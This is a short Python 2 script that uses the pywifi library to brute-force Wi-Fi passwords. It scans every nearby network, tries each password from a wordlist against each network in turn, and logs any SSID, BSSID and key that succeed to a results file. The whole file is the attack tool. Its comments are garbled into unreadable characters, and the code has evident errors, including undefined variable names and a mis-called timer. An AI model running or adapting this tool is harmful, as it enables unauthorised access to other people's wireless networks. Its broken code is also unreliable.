#-*-coding:utf-8-*-#
from pywifi import *
import time
import sys

def main():
	#ɨ��ʱ��
	scantimes = 3
	#������������ӳ� = 15
	output = sys.stdout
	#����ļ�����·��
	files = "TestRes.txt"
	#�ֵ��б�
	keys = open(sys.argv[1],"r").readlines()
	print "|KEYS %s" %(len(keys))
	#ʵ����һ��pywifi����
	wifi = PyWiFi()
	#ѡ��һ����������ֵ��iface
	iface = wifi.interfaces()[0]
	#ͨ��iface����һ��ʱ��Ϊscantimes��ɨ�貢��ȡ�������ȵ��������
	scanres = scans(iface,scantimes)
	#ͳ�Ƹ��������ֵ��ȵ�����
	nums = len(scanres)
	print "| SCAN GET %s" %(nums)
	print "%s\n%-*s| %-*s| %-*s| %-*s | %-*s | %-*s %*s \n%s"%("-"*70,6,"WIFIID",18,"SSID OR BSSID",2,"N",4,"time",7,"signal",10,"KEYNUM",10,"KEY","="*70)
	#��ÿһ���ȵ���Ϣ��һ���в���
	for i,x in enumerate(scanres):
			#������Ϻ󣬳ɹ��Ľ�����洢��files��
			res = test(nums-i,iface,x,keys,ouput,testtimes)
			if res:
					open(files,"a").write(res)
					
def scans(face,timeout):
		#��ʼɨ��
		face.scan()
		time.sleep(timeout)
		#����������ȡɨ����
		return face.scan_results()
		
def test(i,face,x,key,stu,ts):
		#��ʾ��Ӧ�������ƣ����ǵ�������������ʾbssid
		showID = x.bssid if len(x.ssid)>len(x.bssid)else x.ssid
		#�����ֵ䲢���б���
		for n,k in enumerate(key):
				x.key = k.strip()
				#�Ƴ������ȵ�����
				face.remove_all_network_profiles()
				#����װ�õ�Ŀ�곢������
				face.connect(face.add_network_profile(x))
				#��ʼ��״̬�룬���ǵ���0�ᷢ��Щ�߼�����
				code = 10
				t1 = time.time()
				#ѭ��ˢ��״̬�������Ϊ0����������糬ʱ�������һ��
				while code!=0:
					time.sleep(0.1)
					code = face.status()
					now = time.time-t1
					if now>ts:
							break
					stu.write("\r%-*s| %-*s| %s |%*.2fs| %-*s |  %-*s %*s"%(6,i,18,showID,code,5,now,7,x.signal,10,len(key)-n,10,k.replace("\n","")))
					stu.flush()
					if code == 4:
							face.disconnect()
							return "%-*s| %s | %*s |%*s\n"%(20,x.ssid,x.bssid,3,x.signal,15,k)
   	#return False